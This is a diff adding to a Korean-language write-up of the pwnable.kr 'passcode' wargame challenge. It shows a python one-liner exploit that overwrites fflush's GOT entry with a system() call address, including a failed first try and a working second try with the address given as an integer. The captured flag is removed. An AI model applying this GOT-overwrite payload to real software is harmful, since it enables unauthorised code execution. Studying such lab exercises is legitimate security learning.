@@ -228,5 +228,23 @@ End of assembler dump.
   자 이제 payload를 작성 해 보자면
   `a*96 + fflush의 GOT + system()` 함수이다
 
+  자 이제 가볼까낫!
+  ```
+passcode@ubuntu:~$ (python -c 'print "a"*96+"\x04\xa0\x04\x08"+"\xe3\x85\x04\x08"') | ./passcode
+Toddler's Secure Login System 1.0 beta.
+enter you name : Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
+enter passcode1 : enter passcode2 : checking...
+Login Failed!
+  ```
+  읭..?
+  하고 한참 고민 &생각을 했는데....
 
-  아 pwnable.kr 서버터짐 ㅡㅡ 결과.......아 결과........
+  `scanf("%d", passcode1);`...즉 %d... 정수형으로 받는다..!
+  0x080485e3를 정수로 바꾸면... 134514147이 된당..
+  ```
+passcode@ubuntu:~$ (python -c 'print "a"*96+"\x04\xa0\x04\x08"+"134514147"') | ./passcode
+Toddler's Secure Login System 1.0 beta.
+enter you name : Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
+여긴 플래그인데 혹시나 누군가를 위해 지워둠..! 상관은 없지만 그냥 해보고싶었숨...!
+enter passcode1 : Now I can safely trust you that you have credential :)
+  ```
